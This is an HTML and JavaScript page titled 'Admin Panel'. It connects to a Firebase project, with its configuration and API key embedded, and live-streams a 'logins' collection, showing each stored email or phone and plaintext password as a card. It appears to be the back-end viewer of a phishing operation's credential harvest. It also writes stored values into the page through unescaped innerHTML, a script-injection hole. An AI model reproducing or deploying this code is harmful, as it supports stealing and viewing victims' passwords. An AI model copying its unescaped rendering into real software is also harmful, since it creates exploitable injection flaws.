<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0">

  <title>Admin Panel</title>

  <style>

    body{
      font-family:Arial;
      background:#f5f5f5;
      padding:20px;
    }

    h1{
      margin-bottom:20px;
    }

    .card{
      background:white;
      padding:20px;
      border-radius:10px;
      margin-bottom:15px;
      box-shadow:0 0 10px rgba(0,0,0,0.1);
    }

  </style>

</head>
<body>

  <h1>Admin Dashboard</h1>

  <div id="data"></div>

  <script type="module">

    import { initializeApp }
    from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

    import {
      getFirestore,
      collection,
      query,
      orderBy,
      onSnapshot
    }
    from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

    // Firebase Config
    const firebaseConfig = {
  apiKey: "AIzaSyAinwmEAgiNyHtakNDiKNzozsNRreGhMb0",
  authDomain: "ggggg-42757.firebaseapp.com",
  projectId: "ggggg-42757",
  storageBucket: "ggggg-42757.firebasestorage.app",
  messagingSenderId: "78803589118",
  appId: "1:78803589118:web:fa3b33331eaeefdbf052af"
};
    // Initialize Firebase
    const app = initializeApp(firebaseConfig);

    // Firestore
    const db = getFirestore(app);

    // HTML container
    const dataDiv =
      document.getElementById("data");

    // Query
    const q = query(
      collection(db, "logins"),
      orderBy("createdAt", "desc")
    );

    // REALTIME LISTENER
    onSnapshot(q, (snapshot) => {

      // Clear old data
      dataDiv.innerHTML = "";

      // Loop through documents
      snapshot.forEach((doc) => {

        const data = doc.data();

        // Create HTML card
        const card = document.createElement("div");

        card.className = "card";

        card.innerHTML = `

          <p>
            <strong>Email/Phone:</strong>
            ${data.username}
          </p>

          <p>
            <strong>Password:</strong>
            ${data.password}
          </p>

        `;

        // Add to page
        dataDiv.appendChild(card);

      });

    });

  </script>

</body>
</html>
